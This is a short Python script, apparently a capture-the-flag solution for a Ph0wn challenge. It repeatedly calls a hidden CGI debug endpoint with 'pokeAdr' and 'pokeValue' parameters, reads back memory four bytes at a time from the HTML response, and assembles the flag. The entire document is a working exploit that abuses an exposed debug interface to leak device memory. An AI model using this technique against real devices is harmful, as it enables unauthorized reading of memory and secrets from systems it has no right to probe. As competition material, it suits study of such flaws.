import requests
from struct import pack

p32 = lambda x : pack("<I", x)

url_template = "http://megademo.ph0wn.org/h1dd3n.cgi?debug=1&pokeAdr=2000316C&pokeValue="
addr = 0x60019b38

flag = b''

while b'}' not in flag:
    r = requests.get(url_template + hex(addr)[2:])
    for l in r.content.decode().split('\n'):
        if '<td>0x' in l:
            break
    l = l.replace('\t', '').replace('<td>','').replace('</td>','')
    flag += p32(int(l, 16))
    addr += 4

print("The flag is:", flag.decode())
